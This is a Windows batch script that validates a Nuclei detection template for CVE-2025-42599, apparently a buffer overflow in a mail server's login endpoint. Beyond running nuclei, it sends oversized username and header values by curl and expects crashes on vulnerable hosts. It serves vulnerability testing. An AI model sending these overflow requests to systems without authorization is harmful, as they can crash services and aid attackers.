@echo off
REM Test script for CVE-2025-42599 Nuclei template
REM Usage: test-cve-2025-42599.bat <target-url>

setlocal enabledelayedexpansion

REM Check if target URL is provided
if "%~1"=="" (
    echo Error: Target URL is required
    echo Usage: %0 ^<target-url^>
    echo Example: %0 http://192.168.1.100
    exit /b 1
)

set TARGET_URL=%~1
set TEMPLATE_PATH=http/cves/2025/CVE-2025-42599.yaml

echo === CVE-2025-42599 Template Test ===
echo Target: %TARGET_URL%
echo Template: %TEMPLATE_PATH%
echo.

REM Check if nuclei is installed
where nuclei >nul 2>&1
if %errorlevel% neq 0 (
    echo Error: nuclei is not installed
    echo Please install nuclei from: https://nuclei.projectdiscovery.io/
    exit /b 1
)

REM Check if template exists
if not exist "%TEMPLATE_PATH%" (
    echo Error: Template not found at %TEMPLATE_PATH%
    echo Please run this script from the nuclei-templates directory
    exit /b 1
)

echo 1. Testing basic connectivity...
curl -s -I "%TARGET_URL%" >nul 2>&1
if %errorlevel% equ 0 (
    echo ✓ Target is reachable
) else (
    echo ✗ Target is not reachable
    exit /b 1
)

echo.
echo 2. Running Nuclei template test...
echo Command: nuclei -u %TARGET_URL% -t %TEMPLATE_PATH% -debug -v

REM Run nuclei with debug output
nuclei -u "%TARGET_URL%" -t "%TEMPLATE_PATH%" -debug -v

echo.
echo 3. Manual validation tests...

REM Test 1: Basic overflow payload
echo Test 1: Basic overflow payload
python -c "print('A'*1024)" > temp_payload.txt
set /p OVERFLOW_PAYLOAD=<temp_payload.txt
curl -s -X POST "%TARGET_URL%/mail/login" -H "Content-Type: application/x-www-form-urlencoded" -d "username=%OVERFLOW_PAYLOAD%&password=test" -w "Status: %%{http_code}" -o nul
del temp_payload.txt

REM Test 2: Malformed headers
echo.
echo Test 2: Malformed headers
python -c "print('A'*1024)" > temp_payload.txt
set /p OVERFLOW_PAYLOAD=<temp_payload.txt
curl -s -X POST "%TARGET_URL%/mail/login" -H "X-Forwarded-For: %OVERFLOW_PAYLOAD%" -H "User-Agent: %OVERFLOW_PAYLOAD%" -d "username=test&password=test" -w "Status: %%{http_code}" -o nul
del temp_payload.txt

REM Test 3: Extended payload
echo.
echo Test 3: Extended payload
python -c "print('D'*2048)" > temp_payload.txt
set /p EXTENDED_PAYLOAD=<temp_payload.txt
curl -s -X POST "%TARGET_URL%/mail/login" -H "Content-Type: application/x-www-form-urlencoded" -d "username=%EXTENDED_PAYLOAD%&password=test" -w "Status: %%{http_code}" -o nul
del temp_payload.txt

echo.
echo 4. Template validation summary...

REM Check template syntax
echo Validating template syntax...
nuclei -validate -t "%TEMPLATE_PATH%"
if %errorlevel% equ 0 (
    echo ✓ Template syntax is valid
) else (
    echo ✗ Template syntax has errors
)

echo.
echo === Test Complete ===
echo.
echo Expected results for vulnerable systems:
echo - HTTP 500/502/503 status codes
echo - 'Internal Server Error' in response body
echo - Service crash or restart
echo - Connection close headers
echo.
echo Expected results for non-vulnerable systems:
echo - HTTP 200/401/403 status codes
echo - Normal application responses
echo - No buffer overflow errors
echo.
echo For detailed analysis, check:
echo - Application logs
echo - System logs
echo - Service status
echo - Core dumps (if any)

pause
